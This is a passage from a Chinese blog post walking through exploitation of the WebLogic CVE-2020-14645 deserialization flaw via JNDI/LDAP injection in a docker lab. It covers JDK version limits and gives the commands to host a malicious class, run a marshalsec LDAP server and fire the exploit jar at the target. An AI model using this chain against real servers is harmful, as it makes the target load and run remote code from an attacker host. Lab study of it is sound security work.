id="LDAP、RMI及关于RMI、LDAP的选择"><a href="#LDAP、RMI及关于RMI、LDAP的选择" class="headerlink" title="LDAP、RMI及关于RMI、LDAP的选择"></a>LDAP、RMI及关于RMI、LDAP的选择</h3><ol><li>LDAP的中文全称是轻量级目录访问协议</li><li>Java RMI是Java语言的远程调用(官方定义:java 编程接口)</li></ol><p>jdk版本在<b>jndi注入</b>中也起着至关重要的作用，而且不同的攻击对jdk的版本要求也不一致。</p><p><img src="6.jpg" alt=""></p><ul><li><p>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的<code>java.rmi.server.codebase</code>指定路径加载类文件。使用这个属性来防止从其他Codebase地址上动态加载类，增加了<code>RMI ClassLoader</code>的安全性。</p></li><li><p>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p></li><li><p>JDK 6u211、7u201、8u191之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p></li></ul><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdk:</span> <span class="string">8u181(因为版本原因，后续我们用LDAP)</span></span><br><span class="line"><span class="attr">weblogic:</span> <span class="number">12.2</span><span class="number">.1</span><span class="number">.4</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>搭建靶机可以用我最下面分享的一个github上的工具快速搭建，也可以直接镜像= =或者<code>docker-compose.yml</code></p><ol><li><p><a href="https://hub.docker.com/repository/docker/z1du/weblogic12214jdk8u181" target="_blank" rel="noopener">靶机docker镜像</a></p></li><li><p>docker-compose.yml</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: z1du/weblogic12214jdk8u181</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">"7001:7001"</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="1.jpg" alt=""></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开启http服务</span><br><span class="line">python -m http.server 5001</span><br></pre></td></tr></table></figure><p><img src="2.jpg" alt=""></p><p>开启ldap服务(此处192.168.71.128为本机ip)<br>开启rmi方法差不多，我们只需要将LDAPRefServer改为RMIRefServer即可</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    LDAP_ip:LDAP_port/#后面填写你的恶意类的类名  </span><br><span class="line">    <span class="number">1099</span>是你开启rmi服务的端口号，如果不加端口号，它的默认端口号为<span class="number">1099</span>。</span><br><span class="line">    ldap的默认开启端口是<span class="number">1389</span>(无视这边<span class="number">1099</span>，懒得改)</span><br><span class="line"></span><br><span class="line">java -cp marshalsec<span class="number">-0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer http:<span class="comment">//192.168.71.128:5001/#exp 1099</span></span><br></pre></td></tr></table></figure><p>👇</p><p><img src="3.jpg" alt=""></p><p>此处192.168.71.133为靶机ip</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">       LDAP_ip:LDAP_port/#Class_name     weblogic_ip:weblogic_port</span><br><span class="line">java -jar CVE<span class="number">-2020</span><span class="number">-14645.</span>jar <span class="number">192.168</span><span class="number">.71</span><span class="number">.128</span>:<span class="number">1099</span>/#exp http:<span class="comment">//192.168.71.133:7001</span></span><br></pre></td></tr></table></figure><p><b>exp.java</b></p><p><img src="4.jpg" alt=""></p><p><img src="5.jpg" alt=""></p><hr><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/ChenZIDu/CVE-2020-14645" target="_blank" rel="noopener">exp及CVE-2020-14645.jar下载</a></p><p><a href="https://github.com/DSO-Lab/Weblogic_CVE-2020-14645" target="_blank" rel="noopener">Weblogic_CVE-2020-14645反序列化漏洞验证程序</a></p><p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></p><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">weblogic环境快速搭建工具</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">JNDI注入原理及利用</a></p><p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">关于JNDI注入</a></p><p><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;已经有很多分析文章了，直接讲利用实在点&lt;/p&gt;</summary>
    
    
    
    <category term="CVE-2020-14645" scheme="https://chenzidu.github.io/categories/CVE-2020-14645/"/>
    
    
    <category term="java" scheme="https://chenzidu.github.io/tags/java/"/>
    
  </entry>
  
</feed>
